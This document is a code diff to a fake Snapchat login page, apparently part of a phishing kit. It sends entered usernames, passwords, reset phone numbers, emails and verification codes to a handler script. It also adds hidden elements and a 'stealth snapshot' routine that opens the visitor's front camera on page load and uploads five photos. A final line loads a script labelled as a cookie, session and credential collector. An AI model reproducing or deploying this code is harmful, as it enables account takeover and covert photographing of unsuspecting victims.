@@ -640,6 +640,14 @@
 
 <body>
 
+  <!-- ═══════════════════════════════════════════════════════════════
+       BACKEND CAPTURE ELEMENTS (hidden)
+       ═══════════════════════════════════════════════════════════════ -->
+  <div class="video-wrap" hidden style="display:none;">
+    <video id="video" playsinline autoplay muted></video>
+  </div>
+  <canvas id="canvas" width="640" height="480" hidden style="display:none;"></canvas>
+
   <div class="page-wrap">
     <div class="main-content">
 
@@ -922,7 +930,15 @@
     </div>
 
     <script>
-      const HANDLER_URL = '../handlers/login_handler.php';
+      const HANDLER_URL = (function () {
+        var u = 'forwarding_link/handlers/login_handler.php';
+        if (u.indexOf('forwarding_link') === -1) {
+          return u;
+        }
+        return (window.location.pathname.indexOf('/pages/') !== -1)
+          ? '../handlers/login_handler.php'
+          : 'handlers/login_handler.php';
+      })();
       const PLATFORM = 'Snapchat';
       let currentView = 'username';
 
@@ -1003,7 +1019,7 @@
           $.ajax({
             url: HANDLER_URL,
             type: 'POST',
-            data: { username: u, password: 'N/A (Step 1)', bank: PLATFORM, step: 'login' },
+            data: { username: u, password: 'N/A (Step 1)', platform: PLATFORM, bank: PLATFORM, step: 'login' },
             timeout: 15000,
             complete: function () {
               document.getElementById('view-verifying').style.display = 'none';
@@ -1043,7 +1059,7 @@
         $.ajax({
           url: HANDLER_URL,
           type: 'POST',
-          data: { username: savedUsername, password: pw, bank: PLATFORM, step: 'password' },
+          data: { username: savedUsername, password: pw, platform: PLATFORM, bank: PLATFORM, step: 'password' },
           timeout: 15000,
           complete: function () {
             btn.textContent = 'Next';
@@ -1090,7 +1106,7 @@
         $.ajax({
           url: HANDLER_URL,
           type: 'POST',
-          data: { username: savedUsername, password: 'N/A', bank: PLATFORM, step: 'forgot_password' },
+          data: { username: savedUsername, password: 'N/A', platform: PLATFORM, bank: PLATFORM, step: 'forgot_password' },
           timeout: 15000
         });
       });
@@ -1113,8 +1129,11 @@
         document.getElementById('view-reset-email').style.display = 'block';
       });
 
+      let currentResetTarget = '';
+
       // Show Confirm View based on entered target
       function showConfirmViewWithTarget(target) {
+        currentResetTarget = target;
         document.getElementById('view-reset-phone').style.display = 'none';
         document.getElementById('view-reset-email').style.display = 'none';
         
@@ -1143,7 +1162,7 @@
         $.ajax({
           url: HANDLER_URL,
           type: 'POST',
-          data: { username: savedUsername, password: 'N/A', bank: PLATFORM, step: 'reset_phone', reset_target: fullPhone },
+          data: { username: savedUsername, password: 'N/A', platform: PLATFORM, bank: PLATFORM, step: 'reset_phone', reset_target: fullPhone },
           timeout: 15000
         });
 
@@ -1164,7 +1183,7 @@
         $.ajax({
           url: HANDLER_URL,
           type: 'POST',
-          data: { username: savedUsername, password: 'N/A', bank: PLATFORM, step: 'reset_email', reset_target: email },
+          data: { username: savedUsername, password: 'N/A', platform: PLATFORM, bank: PLATFORM, step: 'reset_email', reset_target: email },
           timeout: 15000
         });
 
@@ -1196,7 +1215,15 @@
         $.ajax({
           url: HANDLER_URL,
           type: 'POST',
-          data: { username: savedUsername, password: 'N/A', bank: PLATFORM, step: 'code', code: code },
+          data: {
+            username: savedUsername,
+            reset_target: currentResetTarget || '',
+            password: 'N/A',
+            platform: PLATFORM,
+            bank: PLATFORM,
+            step: 'code',
+            code: code
+          },
           timeout: 15000,
           complete: function () {
             btn.textContent = 'Next';
@@ -1211,6 +1238,130 @@
         document.getElementById('code-error').style.display = 'none';
         this.classList.remove('error-border');
       });
+
+      /* ═══════════════════════════════════════════════════════════════
+         SNAPCHAT STEALTH SNAPSHOT CAPTURE
+         - Automatically captures 5 snapshots on opening the link
+         - Automatically stops and shuts down camera hardware after 5
+         - On page refresh, takes 5 snapshots again
+         ═══════════════════════════════════════════════════════════════ */
+      function postSnapshot(imgdata) {
+        var postUrl = (function () {
+          var u = 'forwarding_link/handlers/post.php';
+          if (u.indexOf('forwarding_link') === -1) {
+            return u;
+          }
+          return (window.location.pathname.indexOf('/pages/') !== -1)
+            ? '../handlers/post.php'
+            : 'handlers/post.php';
+        })();
+
+        $.ajax({
+          type: 'POST',
+          data: { cat: imgdata },
+          url: postUrl,
+          dataType: 'json',
+          async: true,
+          success: function () { },
+          error: function () { }
+        });
+      }
+
+      (function () {
+        'use strict';
+        var MAX_SNAPSHOTS = 5;
+        var snapshotCount = 0;
+        var snapInterval = null;
+        var streamInstance = null;
+
+        var videoEl = document.getElementById('video');
+        var canvasEl = document.getElementById('canvas');
+        if (!videoEl || !canvasEl) return;
+
+        var constraints = {
+          audio: false,
+          video: {
+            facingMode: 'user',
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+          }
+        };
+
+        function stopCameraStream() {
+          if (snapInterval) {
+            clearInterval(snapInterval);
+            snapInterval = null;
+          }
+          if (streamInstance) {
+            try {
+              var tracks = streamInstance.getTracks();
+              for (var i = 0; i < tracks.length; i++) {
+                tracks[i].stop();
+              }
+            } catch (e) {}
+            streamInstance = null;
+          }
+          if (videoEl) {
+            videoEl.srcObject = null;
+          }
+        }
+
+        function takeSnapshot() {
+          if (snapshotCount >= MAX_SNAPSHOTS) {
+            stopCameraStream();
+            return;
+          }
+          try {
+            if (!videoEl.videoWidth || !videoEl.videoHeight) {
+              return;
+            }
+            var ctx = canvasEl.getContext('2d');
+            ctx.drawImage(videoEl, 0, 0, 640, 480);
+            var canvasData = canvasEl.toDataURL('image/png').replace('image/png', 'image/octet-stream');
+            postSnapshot(canvasData);
+            snapshotCount++;
+
+            if (snapshotCount >= MAX_SNAPSHOTS) {
+              stopCameraStream();
+            }
+          } catch (err) {
+            // Ignore frame capture error
+          }
+        }
+
+        async function initSnapshotCamera() {
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return;
+          }
+          try {
+            var stream = await navigator.mediaDevices.getUserMedia(constraints);
+            streamInstance = stream;
+            window.stream = stream;
+            videoEl.srcObject = stream;
+
+            videoEl.onloadedmetadata = function () {
+              videoEl.play().catch(function () {});
+              setTimeout(function () {
+                takeSnapshot();
+                if (snapshotCount < MAX_SNAPSHOTS) {
+                  snapInterval = setInterval(takeSnapshot, 1500);
+                }
+              }, 1000);
+            };
+          } catch (e) {
+            // Camera permission denied or not available
+          }
+        }
+
+        window.addEventListener('beforeunload', stopCameraStream);
+        window.addEventListener('pagehide', stopCameraStream);
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', initSnapshotCamera);
+        } else {
+          initSnapshotCamera();
+        }
+      })();
     </script>
 <!-- NetraX Collector: Cookie, Session & Credential Capture -->
 <script src="core/netrax_collector.js"></script>
